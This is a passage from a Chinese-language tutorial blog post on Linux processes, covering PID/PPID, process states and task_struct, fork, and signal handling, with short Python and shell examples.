title="4.PPID"></a>4.<code>PPID</code></h3><blockquote><p>父进程ID就是<code>PPID</code>.</p><p>在<code>Linux</code> 系统中,所有的进程都是由内核创建的<code>init</code> 进程创建的.<code>init</code> 的<code>PID</code> 为1,它没有<code>PPID</code> ,其他的程序都应该有它的<code>PPID</code> 也就是父进程ID,这种进程模型叫做进程树.</p><p>如果安装了<code>htop</code> ,可以直接运行<code>htop</code> 工具,按照<code>PID</code> 进行排序,可以看到<code>PID</code> 为1的程序.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601130873073-pid.gif" alt="pid"></p></blockquote><h3 id="5-PID-作用"><a href="#5-PID-作用" class="headerlink" title="5.PID 作用"></a>5.<code>PID</code> 作用</h3><blockquote><p>那倒PID最大的作用是杀死系统中的僵尸程序.</p><p>使用命令<code>kill -9</code> 来杀死程序,<code>-9</code> 或其他数字是向进程发送不同的信号.</p></blockquote><h3 id="6-输入和输出"><a href="#6-输入和输出" class="headerlink" title="6.输入和输出"></a>6.输入和输出</h3><blockquote><p>每个进程操作系统都会分配3个文件资源,分别是标准输入(<code>STDOUT</code>),标准输出<code>STDIN</code>,和错误输出(<code>STDERR</code>)</p></blockquote><h3 id="7-并发和并行"><a href="#7-并发和并行" class="headerlink" title="7.并发和并行"></a>7.并发和并行</h3><blockquote><p>并发<code>concurrent</code>和并行<code>parallel</code> 是两个不同的概念.</p><p>并发是一共要处理(<code>deal with</code>)很多事情,并行是一次可以做(<code>do</code>)多少事情.</p><p>如果某个系统支持两个或者多个动作(<code>Action</code>)<strong>同时存在</strong>,那么这个系统就是一个<strong>并发系统</strong>.如果某个系统支持两个或者多个动作<strong>同时执行</strong>,那么这个系统就是一个<strong>并行系统</strong>.并发系统与并行系统这两个定义之间的关键差异在于<code>存在</code>这个词。</p><p>在并发程序中可以同时拥有两个或者多个线程。这意味着，如果程序在单核处理器上运行，那么这两个线程将交替地换入或者换出内存。这些线程是同时<code>存在</code>的——每个线程都处于执行过程中的某个状态。如果程序能够并行执行，那么就一定是运行在多核处理器上。此时，程序中的每个线程都将分配到一个独立的处理器核上，因此可以同时运行。</p><p>我相信你已经能够得出结论——<strong>“并行”概念是“并发”概念的一个子集</strong>。也就是说，你可以编写一个拥有多个线程或者进程的并发程序，但如果没有多核处理器来执行这个程序，那么就不能以并行方式来运行代码。因此，凡是在求解单个问题时涉及多个执行流程的编程模式或者执行行为，都属于并发编程的范畴。</p><p>简单的用图来表示就是</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601130910171-img_5.png"></p><p>并行(<code>parallel</code>):在同一时刻,有多条指令在多个处理器上同时执行.<br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601130927049-img_6.png"></p><p>并发(<code>concurrency</code>):在同一时刻只能有一条执行执行.但多个进程执行被快速的轮换执行.使得在宏观上具有多个进程同时执行的效果,但是在围观上并不是同时执行的,而是把时间分成若干段,是多个进程被快速交替的执行.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601130945022-img_7.png"></p><p>实际上,如果系统只有一个<code>CPU</code> ,而现在使用多线程或者多线程任务,在真实环境中这些任务不可能同时并行.毕竟,一个处理器只能运行一条指令.这样情况下,多线程或者多线程任务就是并发的,而不是并行的.真正的并发也只能在拥有多个CPU的系统中发生.</p><p>计算机是对人的高度模拟抽象,</p><ul><li>并发的动机:在计算能力恒定的情况下处理更多的任务,像人类的大脑,计算能力恒定,要在一天中处理更多的问题,我们必须具备多任务的能力,现实工作中有很多事情可能会中断你的当前任务, 处理这种多任务的能力就是你的并发能力.</li><li>并行的动机:用更多的CPU核心来完成任务.就像人类的团队合作,一个人不够,大家一起动脑筋解决.</li></ul></blockquote><h3 id="8-进程越多越好"><a href="#8-进程越多越好" class="headerlink" title="8.进程越多越好?"></a>8.进程越多越好?</h3><blockquote><p>多进程的并行可以提高并发数,那么进程是越多越好吗? 其实不是的,很多大型的项目都不会同时开太多进程.</p><p>比如<code>Nginx</code> :</p><p>Nginx是一个高性能、高并发的Web服务器，也就是说它可以同时处理超过10万个HTTP请求，而它建议的启动的进程数不要超过CPU个数，为什么呢？</p><p>我们首先要知道Nginx是Master-worker模型，Master进程只负责管理Worker进程，而Worker进程是负责处理真实的请求。每个Worker进程能够处理的请求数跟内存有关，因为在Linux上Nginx使用了epoll这种多路复用的IO接口，所以不需要多线程做并行也能实现并发。</p><p>而多进程有一个坏处就是带来了CPU上下文切换时间，所以一味提高进程个数反而使系统系能下降。当然如果当前进程小于CPU个数，就没有充分利用多核的资源，所以Nginx建议Worker数应该等于CPU个数。</p></blockquote><h3 id="9-进程状态"><a href="#9-进程状态" class="headerlink" title="9.进程状态"></a>9.进程状态</h3><blockquote><p>根据进程的定义,进程是代码运行的实体,二进程有可能是正在运行中的,也可能是已经停止的.这就是进程的状态,对于linux系统来说,进程的状态定义在<a href="https://github.com/torvalds/linux/blob/b6da0076bab5a12afb19312ffee41c95490af2a0/fs/proc/array.c" target="_blank" rel="noopener"><code>fs/proc/array.c</code></a> 文件中</p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* * The task state array is a strange "bitmap" of * reasons to sleep. Thus "running" is zero, and * you can test for combinations of others with * simple bit tests.*/</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> task_state_array<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"R (running)"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">/*   0 */</span>    <span class="token string">"S (sleeping)"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">/*   1 */</span>    <span class="token string">"D (disk sleep)"</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">/*   2 */</span>    <span class="token string">"T (stopped)"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">/*   4 */</span>    <span class="token string">"t (tracing stop)"</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">/*   8 */</span>    <span class="token string">"X (dead)"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">/*  16 */</span>    <span class="token string">"Z (zombie)"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">/*  32 */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>D(disk sleep)</code> 称为不可中断的睡眠(<code>uninterruptible sleep</code>)</p><p>我们通过LINUX命令<code>ps</code>可以明确的看到各种状态的描述信息.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># man ps</span>PROCESS STATE CODES    Here are the different values that the s, <span class="token function">stat</span> and stateoutput specifiers <span class="token punctuation">(</span>header <span class="token string">"STAT"</span> or <span class="token string">"S"</span><span class="token punctuation">)</span> will display todescribe the state of a process:D    uninterruptible <span class="token function">sleep</span> <span class="token punctuation">(</span>usually IO<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#不可中断睡眠</span>R    running or runnable <span class="token punctuation">(</span>on run queue<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#运行程序,可运行程序,运行队列程序</span>S    interruptible <span class="token function">sleep</span> <span class="token punctuation">(</span>waiting <span class="token keyword">for</span> an event to complete<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 可中断睡眠</span>T    stopped by job control signal     <span class="token comment" spellcheck="true"># 通过工作控制信号暂停</span>t    stopped by debugger during the tracing  <span class="token comment" spellcheck="true"># 通过debugger追踪并暂停</span>W    paging <span class="token punctuation">(</span>not valid since the 2.6.xx kernel<span class="token punctuation">)</span>X    dead <span class="token punctuation">(</span>should never be seen<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 程序销亡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从大体上来说,一个进程都会经过3个状态:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601130989507-10018.png"></p><ul><li>就绪状态(<code>READY</code>):<ul><li>当进程已分配到除<code>CPU</code> 以外的所有必要资源后,只要在获得<code>CPU</code> ,便可以立即执行.这个状态叫做就绪状态.在一个系统中处于就绪状态的进程可能有多个.通常把他们排成一个队列,称为就绪队列</li></ul></li><li>执行状态(<code>RUNNING</code>)<ul><li>进程已经获得<code>CPU</code>,程序正在执行.在单处理器系统中,只有一个进程处于执行状态.在多处理器系统中,有多个进程处于执行状态.</li></ul></li><li>阻塞状态(<code>BLOCKED</code>)<ul><li>正在执行的进程由于发生某事件而暂时无法执行时,便放弃处理进入暂停状态.也就是进程的执行收到了阻塞,这种暂停状态被称为阻塞状态.</li><li>进程阻塞的典型事件有:请求<code>I/O</code> ,申请缓冲空间等,通常这种阻塞状态的进程有多个时,就会生成一个队列.有的系统根据阻塞原因把处于阻塞状态的进程分成几个不同的队列</li></ul></li></ul><hr><p>linux中用<code>task_struct</code>结构体来记录一个进程的所有信息(比如进程地址空间,进程状态,打开的文件,PID,PPID等),对内核而言,不管是进程还是线程都被称为<code>task</code> 任务.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601131006815-task_struct.jpg"></p><p>在<code>task_struct</code>中有一个成员<code>state</code>,代表的是进程的状态,通过上面可以看到,在<code>linux</code> 中有7中状态.</p><ul><li>R:<code>task_running</code><ul><li>正在运行或者在就绪队列中等待运行的进程.也就是上面的<strong>运行态</strong> 和<strong>就绪态</strong> 的结合.</li><li>处于<code>RUNNING</code> 状态的进程,在特定时刻不一定是在被执行的.由于在多任务系统中,各个进程需要并发执行.所以在某个特定的时刻,只有一个进程能得到<code>CPU</code> ,其他的进程必须在就绪队列中等待.</li><li>只有该状态的进程才可能在<code>CPU</code> 上运行.这些进程的<code>task_struct</code>结构体被放入对应的<code>CPU</code> 的可执行队列中(一个进程最多只能出现在一个<code>CPU</code>的可执行队列中),进程调度器的任务就是从各个<code>CPU</code> 的可执行队列中分别选择一个进程在该<code>CPU</code>上运行.</li></ul></li><li>D:<code>task_uninterruptible</code><ul><li>不可中断的阻塞状态.处于这种状态的进程正在等待队列中,当资源有效时,可由操作系统唤醒,否则会一直处于等待状态.</li><li>不可中断,指的并不是<code>CPU</code> 不响应外部硬件的中断,而是指进程不响应异步信号<code>SIAGNAL</code>.绝大多数情况下,进程处于睡眠状态下,总是能够响应异步信号的,否则<code>kill -9</code> 不能杀死一个进程.</li><li>不可中断存在的意义在于,内核的某些处理流程是不能被中断的.参见<code>linux内核异步中断浅析</code>这本书的例子.</li></ul></li><li>S:<code>task_interruptible</code><ul><li>可中断阻塞状态.类似上一个,当资源有效时,可由操作系统唤醒,否则会一直处于等待状态.</li><li>与不可中断阻塞的区别是, 这个状态的进程异步响应信号.可以被其他进程的信号唤醒.</li><li>处于这种状态的进程因为等待某事件的发生(比如<code>socket</code>连接等),而被挂起.这些进程的<code>task_struct</code> 被放入事件的等待队列中,当事件发生时,对应的等待队列中的一个或多个进程被唤醒.</li></ul></li><li>T:<code>task_stopped</code>or<code>task_traced</code><ul><li>暂停状态或追踪状态.</li><li>向进程发送一个信号<code>SIGSTOP</code> (停止信号),该进程会进入<code>task_stopped</code> 状态.(<code>SIGSTOP</code> 与<code>SIGKILL</code> 信号一样,是非常强烈的,不允许用户进程通过<code>signal</code> 系列的系统调用从新设置对应的信号处理函数),向进程发送一个<code>SIGCONT</code>(继续信号),进程会从<code>task_stopped</code> 状态恢复到<code>task_running</code>状态.</li><li>当进程正在被追踪时,处于<code>task_traced</code>这个特殊的状态,被追踪指的是进程暂停下来,等待追踪它的进程对它的操作.比如python中gdb调试断点.</li><li><code>task_straced</code> 和<code>task_stopped</code> 都会进入暂停状态,但是<code>task_straced</code> 状态不会响应<code>SIGCONT</code> 状态而被唤醒,只能等到调试进程通过<code>ptrace</code> 系统调用执行<code>ptrace_cont</code>等操作,或者是调试进程退出,被调试的进程才能重新回到<code>task_running</code>状态.</li></ul></li><li>Z:<code>task_dead\EXIT_ZOMBIE</code><ul><li>进程在退出的过程中,处于<code>task_dead</code>状态.</li><li>在退出过程中,进程占用的所有资源被回收(除了<code>task_struct</code>结构体).于是,进程只剩下了<code>task_struct</code>结构体这个空壳,所以被称为<code>zombie</code> .之所以保留结构体,是因为它里面存储了进程的退出码以及一些统计信息.而其父进程很可能会关心这些.比如在<code>shell</code> 中,<code>$?</code> 变量保存了最后一个退出前台进程的退出码,而这个退出码会被当做<code>if</code>的判断条件使用.当然,内核也可以将这些信息保存在别的地方,而将<code>task_struct</code>释放掉,以节省内存空间.但是使用<code>task_struct</code> 更方便,因为在内核中已经建立了<code>PID</code>到<code>task_struct</code>的对应关系.</li><li>父进程可以通过<code>wait</code>系列的系统调用(<code>wait4\waiteid</code>) 来等待某个或某些子进程的退出,并获取它的退出信息.然后通过<code>wait</code> 将子进程的尸体(<code>task_struct</code>)也释放掉.子进程在退出的过程中,内核会给其父进程发送一个信号,通知父进程来处理.这个信号默认是<code>SIGCHILD</code>,但是通过创建<code>clone</code>克隆子进程时,可以设置这个信号.</li></ul></li></ul><hr><p>进程的生命周期</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601131063239-process_life.png"></p><p>一个进程完整的经过各种状态的生命周期.</p><hr><p>查看<code>R\S\T</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 新建一个终端,并执行以下命令</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span> kning@kning-pc:~$ <span class="token function">sleep</span> 100 <span class="token operator">&amp;</span>   <span class="token comment" spellcheck="true"># 调入后台执行</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span> 20998<span class="token punctuation">(</span>base<span class="token punctuation">)</span> kning@kning-pc:~$ <span class="token function">ps</span> -o pid,state,commandPID S COMMAND20884 S /bin/bash20998 S <span class="token function">sleep</span> 10021002 R <span class="token function">ps</span> -o pid,state,command<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>进程控制块(<code>PCB</code>)</p><p>在Linux中的<code>task_struct</code>结构体就是<code>PCB</code>.<code>PCB</code>是进程的唯一标识.<code>PCB</code>由链表实现(为了动态插入和删除).</p><p><code>PCB</code> 包含的信息很多,比如进程状态(<code>state</code>),进程标识信息(<code>uid/gid</code>),定时器(<code>time</code>),栈指针等等.</p><p>每个进程都有一个非负的进程ID(<code>PID</code>),虽然是唯一的,但是它可以重用,当一个进程终止后,其他进程就可以使用它的<code>PID</code> 了.</p><ul><li><code>PID</code>为0 的进程为调度进程,它是内核的一部分,也叫系统进程</li><li><code>PID</code>为1的进程为<code>init</code>进程,它是一个普通的用户进程,但是以超级用户特权运行</li><li><code>PID</code>为2的进程是页面守护进程,负责支持虚拟存储的分页操作.</li></ul><p>除去<code>PID</code>,每个进程还有一些其他的标识符:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"进程运行的pid:"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"进程父进程的pid"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>bash <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"ps aux | grep {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"父进程在ubuntu中的信息"</span><span class="token punctuation">,</span> bash<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用进程的实际用户uid"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cat /etc/passwd | grep {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>msg1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用进程的有效用户euid"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>msg2 <span class="token operator">=</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"cat /etc/passwd | grep {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>msg2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用进程的实际用户组gid"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getgid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用进程的有效组egid"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getegid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>进程的创建</p><p>新进程的创建,首先在内存中为新进程创建一个<code>task_struct</code>结构,然后把父进程的<code>task_truct</code>复制其中,在修改部分数据,分配新的内核堆栈,新的PID,再将<code>task_struct</code>这个node添加到链表中.所谓创建,实际上是<code>复制</code>.</p><p>子进程刚开始,内核并没有为他分配物理内存,而是以只读的方式共享父进程的内存,只有当子进程写入(<code>copy-on-write</code>)时,才复制</p><p><code>fork</code> 是有<code>do_fork</code>函数事件的,流程为:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-26/1601131080780-10021.png"></p><hr><p><code>fork</code> 函数调用一次,返回两次,在父进程和子进程中各调用一次,子进程中返回值为0,父进程返回子进程的<code>PID</code>,可以根据返回值的不同对子进程和父进程做不同的操作.</p><p>一般来说,<code>fork</code>之后父子进程执行的顺序是不确定的,取决与内核调度算法.进程之间同步需要进程通信.</p><p><code>fork</code> 应用场景常见于网络服务:父进程等待客户端的服务请求,当请求到达后,父进程调用<code>fork</code>,使自进程处理请求.</p><p><code>fork</code> 不会修改全局变量,而且父进程,子进程执行顺序没有规律,是有系统的调度器决定的,<a href="./10052.md">参见</a></p><p>在linux中还有会创建进程的函数<code>vfork</code>,它创建的子进程与父进程共享内存,而且创建的子进程优于父进程执行.</p><p>在<code>python</code>的<code>os</code>模块中<code>fork</code> 函数,它的使用类似于:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>sysret <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token keyword">if</span> ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># 子进程返回值永远是0</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是子进程.子进程PID:{},父进程PID{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是父进程,父进程PID:{},父进程fork返回值是子进程的PID:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="10-signal-信号机制"><a href="#10-signal-信号机制" class="headerlink" title="10.signal 信号机制"></a>10.<code>signal</code> 信号机制</h3><blockquote><p>信号是一种软中断,信号机制是进程之间通信的一种方式,采用的是异步通信方式</p><p>linux系统中共定义了64种信号,分为2大类.</p><ul><li>不可靠信号:(1-31),也称为非实时信号,不支持排队,信号可能会丢失,比如发送多次相同的信号,进程只能接受一次.</li><li>可靠信号:(21-64),实时信号,支持排队,信号不能丢失,发多少次,就接受多少次.</li><li>信号可以使用<code>kill -l</code> 来查看</li></ul><p>不可靠信号表</p><table><thead><tr><th>取值</th><th>名称</th><th>解释</th><th>默认动作</th></tr></thead><tbody><tr><td>1</td><td>SIGHUP</td><td>挂起</td><td></td></tr><tr><td>2</td><td>SIGINT</td><td>中断</td><td></td></tr><tr><td>3</td><td>SIGQUIT</td><td>退出</td><td></td></tr><tr><td>4</td><td>SIGILL</td><td>非法指令</td><td></td></tr><tr><td>5</td><td>SIGTRAP</td><td>断点或陷阱指令</td><td></td></tr><tr><td>6</td><td>SIGABRT</td><td>abort发出的信号</td><td></td></tr><tr><td>7</td><td>SIGBUS</td><td>非法内存访问</td><td></td></tr><tr><td>8</td><td>SIGFPE</td><td>浮点异常</td><td></td></tr><tr><td>9</td><td>SIGKILL</td><td>kill信号</td><td>不能被忽略、处理和阻塞</td></tr><tr><td>10</td><td>SIGUSR1</td><td>用户信号1</td><td></td></tr><tr><td>11</td><td>SIGSEGV</td><td>无效内存访问</td><td></td></tr><tr><td>12</td><td>SIGUSR2</td><td>用户信号2</td><td></td></tr><tr><td>13</td><td>SIGPIPE</td><td>管道破损，没有读端的管道写数据</td><td></td></tr><tr><td>14</td><td>SIGALRM</td><td>alarm发出的信号</td><td></td></tr><tr><td>15</td><td>SIGTERM</td><td>终止信号</td><td></td></tr><tr><td>16</td><td>SIGSTKFLT</td><td>栈溢出</td><td></td></tr><tr><td>17</td><td>SIGCHLD</td><td>子进程退出</td><td>默认忽略</td></tr><tr><td>18</td><td>SIGCONT</td><td>进程继续</td><td></td></tr><tr><td>19</td><td>SIGSTOP</td><td>进程停止</td><td>不能被忽略、处理和阻塞</td></tr><tr><td>20</td><td>SIGTSTP</td><td>进程停止</td><td></td></tr><tr><td>21</td><td>SIGTTIN</td><td>进程停止，后台进程从终端读数据时</td><td></td></tr><tr><td>22</td><td>SIGTTOU</td><td>进程停止，后台进程想终端写数据时</td><td></td></tr><tr><td>23</td><td>SIGURG</td><td>I/O有紧急数据到达当前进程</td><td>默认忽略</td></tr><tr><td>24</td><td>SIGXCPU</td><td>进程的CPU时间片到期</td><td></td></tr><tr><td>25</td><td>SIGXFSZ</td><td>文件大小的超出上限</td><td></td></tr><tr><td>26</td><td>SIGVTALRM</td><td>虚拟时钟超时</td><td></td></tr><tr><td>27</td><td>SIGPROF</td><td>profile时钟超时</td><td></td></tr><tr><td>28</td><td>SIGWINCH</td><td>窗口大小改变</td><td>默认忽略</td></tr><tr><td>29</td><td>SIGIO</td><td>I/O相关</td><td></td></tr><tr><td>30</td><td>SIGPWR</td><td>关机</td><td>默认忽略</td></tr><tr><td>31</td><td>SIGSYS</td><td>系统调用异常</td><td></td></tr></tbody></table><p>对于信号,绝大多数都是终止进程或停止进程,或<code>dump</code> 内核印象转储</p><hr><p>信号的来源分为两大类:</p><ul><li>硬件方式:<ul><li>用户输入:比如在终端上按下组合件<code>ctrl+c</code> ,会发送<code>SIGINT</code> 信号.</li><li>硬件异常:<code>CPU</code>监测到内存非法访问等异常,通知内核生成相应的信号,并发送给发生事件的程序</li></ul></li><li>软件方式:<ul><li>通过系统调用,发送信号,比如<code>kill(),raise()</code>等</li><li>python通过<code>os,signal</code>函数调用系统发送信号</li></ul></li></ul><hr><p>信号注册和注销:</p><ul><li>注册:在进程的<code>task_struct</code>结构体中有一个未决信号的成员变量<code>struct sigpending pending</code>,每个信号在进程中注册都会把信号值写入进程的未决信号集<ul><li>非实时信号:如果该信息已经在进程中注册过,不会再次注册,故信号会丢失</li><li>实时信号:不管信号是否在进程中注册,都会再次注册,故信号不会丢失</li></ul></li><li>注销:<ul><li>非实时信号:最多有一个<code>sigqueue</code>结构,当该结构被释放后,把该信号从未决信号集中删除,则信号注册完毕.</li><li>实时信号:可能有多个<code>sigqueue</code>,当该信号的所有<code>sigqueue</code>处理完毕后,把该信号从未决信号集中删除,则信号注册完毕.</li></ul></li></ul><hr><p>信号处理: 内核处理进程收到的<code>signal</code> 是当前进程的上下文,故该进程必须是<code>running</code> 状态.当进程唤醒或者从新调度后获取<code>CPU</code>,则会从内核态转到用户态时检测是否有<code>signal</code>等待处理,处理完后,进程会把未决信号从链表中删除.</p><p>处理时机:内核态=&gt;<code>signal</code>信号=&gt;用户态:</p><ul><li>在内核态,signal信号不起作用</li><li>在用户态,signal所有没有被屏蔽的信号都处理完毕</li><li>当屏蔽信号,取消屏蔽时,会在下一次内核转用户态的过程中执行.</li></ul><p>处理方式:</p><ul><li>默认:接受到信号后按照默认的行为处理该信号,这是多数应用采取的方式</li><li>自定义:用户自定义的信号处理函数来执行特定的动作</li><li>忽略:接受到信号后不做任何反应.</li></ul><p>信号安装:进程处理某个信号前,需要先在进程中安装次信号,安装过程主要是建立信号值和进程对相应信息值的动作</p><p>信号安装函数:</p><ul><li>signal():不支持信号传递信息,主要用于非实时信号安装</li><li>sigaction():支持信号传递信息,可用于所有信号安装<ul><li>sa_handle:信号处理函数</li><li>sa_mask:指定信号处理程序执行过程中需要阻塞的信号</li><li>sa_flag:标志位<ul><li>SA_RESTART:使被希腊佛打断的syascall重新发起</li><li>SA_NOCLDSTO:使父进程在它的子进程暂停或继续运行时不会收到<code>sigchild</code>值</li><li>SA_NOCLDWAIT:使父进程在它的子进程退出时不会收到SIGCHLD信,这时子进程如果退出也不会成为僵 尸进程</li><li>SA_NODEFER:使对信号的屏蔽无效,即在信号处理函数执行期间仍能发出这个信号</li><li>SA_RESETHAND:号处理之后重新设置为默认的处理方式</li><li>SA_SIGINFO:使用sa_sigaction成员而不是sa_handler作为信号处理函数</li></ul></li></ul></li></ul><p>信号发送:</p><ul><li>kill(): 用于向进程或进程组发送信号</li><li>sigqueue():只能向一个进程发送信号,不能向进程组发送信号,主要针对实时信号提出,与sigaction()组合使用,当然也支持非实时信号的发送</li><li>alarm():用于调用进程指定时间后发出SIGALARM信号</li><li>setitimer():设置定时器,计时达到后给进程发送<code>sigalem</code>信号</li><li>abort();向进程发送<code>sigabort</code>信号,默认进程会异常退出</li><li>raise():用于向进程自身发送信号.</li></ul><hr><p>linux前台进程\后台进程可以用发送信号的形式执行:</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sleep</span> 100 <span class="token operator">&amp;</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span> 28761$ <span class="token function">ps</span> -o pid,state,commandPID S COMMAND28761 S <span class="token function">sleep</span> 100<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>$ <span class="token function">kill</span> -STOP 28761<span class="token punctuation">[</span>1<span class="token punctuation">]</span>+  Stopped                 <span class="token function">sleep</span> 100$ <span class="token function">ps</span> -o pid,state,commandPID S COMMAND28761 T <span class="token function">sleep</span> 100<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>$ <span class="token function">kill</span> -CONT 28847$ <span class="token function">ps</span> -o pid,state,commandPID S COMMAND28847 S <span class="token function">sleep</span> 100<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>处于<code>S</code> 状态的进程可以接受来自其他进程的信息,比如:</p><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import os, signal; os.kill(os.getpid(), signal.SIGSTOP)"</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>  Stopped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p><code>waitpid()</code> 是<code>c</code> 定义的一个函数,可以在linux命令行中直接使用它的定义是:</p><pre class="line-numbers language-bash"><code class="language-bash">waitpid<span class="token punctuation">(</span>pid, *status, options<span class="token punctuation">)</span>waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span> 会暂时停止目前进程的执行,直到有信号来到或子进程结束,如果调用waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span>时子进程已经结束,则waitpid<span class="token 